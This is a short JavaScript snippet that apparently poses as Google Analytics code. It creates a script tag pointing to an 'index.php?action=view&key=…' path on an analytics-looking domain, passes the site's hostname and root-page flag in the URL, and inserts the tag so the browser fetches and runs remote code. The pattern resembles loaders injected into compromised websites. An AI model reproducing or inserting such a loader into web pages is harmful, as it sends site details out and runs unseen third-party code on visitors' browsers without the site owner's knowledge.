
var site_url = '//www.google-analytics.com';
var script = document.createElement('script');
script.async = true;
script.type = 'text/javascript';
script.src = site_url + '/index.php?action=view&key=b3bf60b851ebaeb2768b01a32e2ef32f&host=' + window.location.hostname + '&root=' + (window.location.pathname == '/');
node = document.getElementsByTagName('script')[0];
node.parentNode.insertBefore(script, node);